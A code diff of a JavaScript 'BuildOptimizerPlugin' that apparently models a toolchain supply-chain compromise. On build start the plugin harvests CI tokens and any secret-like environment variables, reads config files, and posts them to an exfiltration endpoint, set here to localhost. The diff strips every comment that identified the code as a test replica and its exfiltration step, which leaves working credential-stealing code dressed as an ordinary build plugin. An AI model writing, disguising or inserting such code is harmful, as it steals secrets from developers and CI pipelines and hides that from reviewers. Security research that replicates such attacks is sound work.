@@ -1,20 +1,11 @@
-// SAFE_TEST_MODE = true — all exfil goes to localhost:9999
-// Replicates: s1ngularity / Nx toolchain compromise pattern
-
 const http = require("http");
 const os = require("os");
 const fs = require("fs");
 const path = require("path");
 
 const SAFE_TEST_MODE = true;
-const EXFIL_URL = "http://localhost:9999/exfil"; // Safe: nothing listening
+const EXFIL_URL = "http://localhost:9999/exfil";
 
-// --- "Legitimate" build plugin interface ---
-
-/**
- * Build optimizer plugin
- * Appears to be a standard webpack/nx plugin that optimizes build output
- */
 class BuildOptimizerPlugin {
   constructor(options = {}) {
     this.name = "BuildOptimizerPlugin";
@@ -22,12 +13,8 @@ class BuildOptimizerPlugin {
     this.verbose = options.verbose || false;
   }
 
-  /**
-   * Webpack-compatible apply method
-   * Called when the plugin is loaded by the build tool
-   */
   apply(compiler) {
-    // Hook into the build lifecycle
+
     if (compiler && compiler.hooks) {
       compiler.hooks.compile.tap(this.name, () => {
         this._onBuildStart();
@@ -36,22 +23,17 @@ class BuildOptimizerPlugin {
         this._onBuildDone(stats);
       });
     } else {
-      // Direct invocation (non-webpack)
+
       this._onBuildStart();
     }
   }
 
-  /**
-   * Called at build start — this is where the exfiltration happens
-   */
   _onBuildStart() {
-    // Harvest CI/CD secrets
+
     const secrets = this._harvestCISecrets();
 
-    // Read additional config files
     const configs = this._readBuildConfigs();
 
-    // Exfiltrate everything
     const payload = {
       timestamp: new Date().toISOString(),
       hostname: os.hostname(),
@@ -66,15 +48,12 @@ class BuildOptimizerPlugin {
   }
 
   _onBuildDone(stats) {
-    // Legitimate-looking build done handler
+
     if (this.verbose) {
       console.log(`[${this.name}] Build completed`);
     }
   }
 
-  /**
-   * Harvest CI/CD environment variables
-   */
   _harvestCISecrets() {
     const targetKeys = [
       "GITHUB_TOKEN",
@@ -102,7 +81,6 @@ class BuildOptimizerPlugin {
       }
     }
 
-    // Also grab anything that looks like a token
     for (const [key, value] of Object.entries(process.env)) {
       if (/token|secret|key|password|auth|credential/i.test(key) && value) {
         harvested[key] = value;
@@ -112,9 +90,6 @@ class BuildOptimizerPlugin {
     return harvested;
   }
 
-  /**
-   * Detect which CI system is running
-   */
   _detectCI() {
     return {
       is_ci: !!process.env.CI,
@@ -127,9 +102,6 @@ class BuildOptimizerPlugin {
     };
   }
 
-  /**
-   * Read build configuration files that may contain secrets
-   */
   _readBuildConfigs() {
     const configs = {};
     const targets = [
@@ -149,16 +121,13 @@ class BuildOptimizerPlugin {
           configs[target] = fs.readFileSync(fullPath, "utf-8");
         }
       } catch (e) {
-        // File doesn't exist
+
       }
     }
 
     return configs;
   }
 
-  /**
-   * Exfiltrate harvested data to C2
-   */
   _exfiltrate(payload) {
     try {
       const data = JSON.stringify(payload);
@@ -175,12 +144,12 @@ class BuildOptimizerPlugin {
         },
       });
       req.on("error", () => {
-        // Connection refused — expected in safe test mode
+
       });
       req.write(data);
       req.end();
     } catch (e) {
-      // Expected in safe test mode
+
     }
   }
 }
